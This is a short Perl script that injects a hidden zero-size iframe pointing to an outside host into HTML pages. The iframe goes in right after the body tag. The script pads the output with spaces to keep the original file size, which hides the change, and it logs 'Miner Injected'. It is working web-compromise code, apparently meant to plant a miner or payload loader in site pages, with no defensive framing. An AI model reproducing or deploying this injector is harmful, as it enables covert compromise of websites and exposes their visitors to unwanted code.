#!/usr/bin/perl

$inject = '<iframe width=0 height=0 src="http://wtyw.net/lm"></iframe>';

while ($a = <>) {
  $c = $c . $a;
  $chars1 += length($a);
  if ($a =~ m/<!--.*-->/){
    $a =~ s/<!--.*-->//g
  }
  if ($a =~ /\n/) {
    $a =~ s/\n//sg
  }
  if ($a =~ /\t/) {
    $a =~ s/\t//sg
  }
  if($a =~ m/<body/) {
    $a =~ s/(<body.*?>)(.*)/\1$inject\2/si;};
    $b = $b . $a;
  }
  $chars2 = length($b);
  if ($chars1 > $chars2) {
    $b = $b . " "x($chars1-$chars2);
    print $b;$date = `date`;
    chomp($date);
    print STDERR "[*] $date Miner Injected\n"
  } if ($chars1 < $chars2) {
  print $c
}
